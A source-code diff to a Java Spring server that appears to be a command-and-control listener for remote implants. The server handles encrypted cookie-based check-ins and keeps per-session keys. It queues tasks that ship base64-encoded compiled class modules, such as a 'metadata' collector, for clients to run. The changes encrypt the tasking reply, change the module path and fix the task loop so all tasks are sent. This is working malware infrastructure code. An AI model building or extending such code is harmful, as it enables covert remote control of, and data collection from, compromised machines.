@@ -90,6 +90,7 @@ public class ListenerApplication {
 
 			String nonce = idCookie.substring(0,12).replace("-","");
 
+			String currentKey;
 
 			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes());
 			byte[] decryptedData = sapi.decrypt(rawPostData,nonce.getBytes(),epc.encKey);
@@ -106,12 +107,18 @@ public class ListenerApplication {
 			{
 				sessionData = new session();
 				sessionData.nonce = nonce;
-				sessionData.tasks.add(napi.mkTask("autoApi","metadata",new String[]{}));
+				sessionData.tasks.add(napi.mkTask("autoLib","metadata",new String[]{}));
+
 				epc.sessionTable.put(idCookie, sessionData);
+				currentKey = epc.encKey;
+			}
+			else
+			{
+				sessionData = (session) epc.sessionTable.get(idCookie);
+				currentKey = sessionData.encKey;
 			}
 
-			sessionData = (session) epc.sessionTable.get(idCookie);
-
+		
 			sessionData.cookie = napi.mkCookie(idCookie, epc.passwd);
 			sessionData.encKey = napi.strand(32);
 			sessionData.nonce =  napi.strand(12);
@@ -120,7 +127,19 @@ public class ListenerApplication {
 
 			epc.sessionTable.put(idCookie,sessionData);
 
-			return napi.xmlDocToString(napi.outputToXmlDoc(sessionData.cookie, sessionData.encKey, sessionData.nonce, sessionData.tasks));
+			System.out.println(napi.xmlDocToString(napi.outputToXmlDoc(sessionData.cookie, sessionData.encKey, sessionData.nonce, sessionData.tasks)));
+
+			String retrDoc = napi.xmlDocToString(napi.outputToXmlDoc(sessionData.cookie, sessionData.encKey, sessionData.nonce, sessionData.tasks));
+
+			return new String(
+				Base64.getEncoder().encode(
+					sapi.encrypt(
+						retrDoc.getBytes(),
+						nonce.getBytes(),
+						currentKey
+					)
+				)
+			);
 		}
 
 		@PostMapping("/60001")
@@ -263,7 +282,7 @@ class noceboApi
 
 		public Hashtable mkTask(String className, String methodName, String[] args) throws IOException
 		{
-			String modPath = String.format("..%sfileroot%s%s.class",File.separator,File.separator,className);
+			String modPath = String.format("..%sfileroot%scom%snocebo%snCore%s%s.class",File.separator,File.separator,File.separator,File.separator,File.separator,className);
 			byte[] fileData = Files.readAllBytes(Paths.get(modPath));
 			String modData = new String(Base64.getEncoder().encode(fileData));
 
@@ -274,6 +293,7 @@ class noceboApi
 			taskData.put("args",String.join(",",args));
 			taskData.put("mod",modData);
 			
+
 			return taskData;
 		}
 
@@ -337,9 +357,10 @@ class noceboApi
 			
 
 			//task parsing
-			for (int q=0; q<tasks.size()-1; q++)
+			for (int q=0; q<tasks.size(); q++)
 			{
 				Hashtable taskDescriptor = (Hashtable) tasks.get(q);
+
 				Enumeration<String> k = taskDescriptor.keys();
 				Element tElement = doc.createElement("task");
 
